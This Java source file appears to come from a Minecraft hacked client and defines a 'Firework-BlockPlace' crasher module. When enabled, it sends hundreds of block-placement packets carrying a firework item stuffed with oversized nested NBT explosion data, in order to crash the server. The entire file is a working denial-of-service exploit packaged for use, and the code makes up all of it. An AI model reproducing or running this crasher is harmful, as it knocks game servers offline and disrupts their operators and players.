package it.thatskai.aragosta.module.crasher;

import it.thatskai.aragosta.AragostaMain;
import it.thatskai.aragosta.annotations.modules.IModule;
import it.thatskai.aragosta.annotations.modules.Module;
import it.thatskai.aragosta.module.Category;
import it.thatskai.aragosta.settings.Setting;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
import net.minecraft.util.BlockPos;

import java.util.Arrays;

import static it.thatskai.aragosta.utils.MessageUtils.sendMessage;

@IModule(
        name = "Firework-BlockPlace",
        key = 0,
        category = Category.CRASHERS
)
public class FireworkBlockPlaceModule extends Module {

    public void setup() {
        AragostaMain.instance.settingsManager.rSetting(new Setting(getName(), this, 430, 40, 1000, true));
    }

    public void onEnable() {
        int packets = (int) AragostaMain.instance.settingsManager.getSettingByName(getName()).getValDouble();
        sendMessage("Mandando " + packets + " pacchetti con il metodo "+getName(), true);
        Minecraft mc = Minecraft.getMinecraft();
        for (int i = 0; i < packets; ++i) {
            NBTTagCompound tag2 = new NBTTagCompound();
            NBTTagCompound tag = new NBTTagCompound();
            NBTTagList list = new NBTTagList();
            NBTTagCompound expl = new NBTTagCompound();
            ItemStack fw = new ItemStack(Items.fireworks);
            int[] arr = new int[64];
            for (int k = 0; k < 1000; ++k) {
                Arrays.fill(arr, k + 1);
                expl.setIntArray("Colors", arr);
                list.appendTag(expl);
            }
            tag.setTag("Explosions", list);
            tag.setByte("Flight", (byte) 2);
            tag2.setTag("Fireworks", tag);
            fw.setTagCompound(tag2);
            Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C08PacketPlayerBlockPlacement(
                    new BlockPos(mc.thePlayer.posX, mc.thePlayer.posY - 2.0, mc.thePlayer.posZ), 1, fw, 0.0f, 0.0f, 0.0f));
        }
        sendMessage("&7Crashing..", false);
        toggle();
    }
}

